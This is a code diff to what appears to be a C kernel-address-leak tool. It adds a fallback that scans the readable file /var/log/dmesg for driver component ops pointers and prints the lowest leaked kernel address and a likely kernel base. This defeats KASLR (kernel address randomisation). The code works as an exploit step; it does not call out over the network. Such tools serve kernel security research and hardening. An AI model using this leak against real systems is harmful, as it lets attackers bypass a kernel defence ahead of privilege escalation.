@@ -17,7 +17,8 @@
 // the kernel image.
 //
 // Requires:
-// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
+//   readable /var/log/dmesg.
 // - CONFIG_KALLSYMS=n
 //
 // References:
@@ -74,10 +75,57 @@ unsigned long search_dmesg_driver_component_ops() {
   return addr;
 }
 
+unsigned long search_dmesg_log_file_driver_component_ops() {
+  FILE *f;
+  char *endptr;
+  char *line = 0;
+  size_t size = 0;
+  char *ops_buf;
+  const char *path = "/var/log/dmesg";
+  const char *needle = " (ops 0x";
+  unsigned long leaked_addr = 0;
+  unsigned long addr = 0;
+
+  printf("[.] searching %s for driver component ops pointers ...\n", path);
+
+  f = fopen(path, "rb");
+
+  if (f == NULL) {
+    perror("[-] fopen");
+    return 0;
+  }
+
+  while ((getline(&line, &size, f)) != -1) {
+    ops_buf = strstr(line, needle);
+
+    if (ops_buf == NULL)
+      continue;
+
+    leaked_addr = strtoul(&ops_buf[strlen(needle)], &endptr, 16);
+
+    if (!leaked_addr)
+      continue;
+
+    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
+      // printf("Found kernel pointer: %lx\n", leaked_addr);
+      if (!addr || leaked_addr < addr)
+        addr = leaked_addr;
+    }
+  }
+
+  fclose(f);
+
+  return addr;
+}
+
 int main() {
   unsigned long addr = search_dmesg_driver_component_ops();
   if (!addr)
+    addr = search_dmesg_log_file_driver_component_ops();
+
+  if (!addr)
     return 1;
+
 
   printf("lowest leaked address: %lx\n", addr);
   printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
